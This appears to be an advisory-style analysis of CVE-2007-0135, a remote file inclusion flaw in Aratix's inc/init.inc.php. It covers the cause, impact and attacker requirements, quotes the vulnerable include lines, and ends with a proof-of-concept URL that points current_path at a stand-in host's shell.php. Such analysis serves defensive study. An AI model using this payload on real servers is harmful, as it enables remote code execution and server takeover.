Based on the provided content, here's an analysis of CVE-2007-0135:

**Root Cause of Vulnerability:**
The vulnerability lies in the `inc/init.inc.php` file of Aratix versions 0.2.2b11 and earlier. The `$current_path` variable is not initialized before being used in `include` statements. If `register_globals` is enabled, an attacker can set the value of `$current_path` via a query string, leading to remote file inclusion.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The core vulnerability is the ability to include a remote file specified by the attacker.
*   **Uninitialized Variable:** The `$current_path` variable is used without being initialized with a default or expected value.
*  **Reliance on `register_globals`:** The exploit relies on the `register_globals` PHP setting being enabled, which is a security risk.

**Impact of Exploitation:**

*   **Remote Code Execution (RCE):** By including a malicious file, an attacker can execute arbitrary PHP code on the server. This can lead to full control of the web server.
*   **Data Breach:** The attacker may gain access to sensitive data stored on the server.
*   **Server Compromise:** A successful exploit can compromise the entire web server and potentially other systems on the same network.

**Attack Vectors:**

*   **HTTP GET Request:** The attacker crafts a malicious URL with a `current_path` parameter containing the URL to the malicious file. The vulnerable script then includes this remote file using `include()`.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
*   **Knowledge of Vulnerable Software:** The attacker needs to know the vulnerable software and the path to the vulnerable file (`inc/init.inc.php`).
*   **Remote File Hosting:** The attacker needs access to a server or online location where the malicious PHP file is hosted.
*   **Target Server Configuration:** The target server must have `register_globals` enabled.

**Technical Details:**
The vulnerable code in `inc/init.inc.php` includes these lines, where the uninitialized `$current_path` is used:

```php
include $current_path . 'inc/session.inc.php';
include $current_path . 'inc/pages.inc.php';
include $current_path . 'inc/modules.inc.php';
include $current_path . 'inc/functions.inc.php';
include $current_path . 'extern/smarty/Smarty.class.php';
```

**Proof of Concept:**
The provided exploit example is:
`http://[target]/[path]/inc/init.inc.php?current_path=http://evilsite.com/shell.php?`

This demonstrates how an attacker can include a remote file named `shell.php` from `evilsite.com` on the target server.
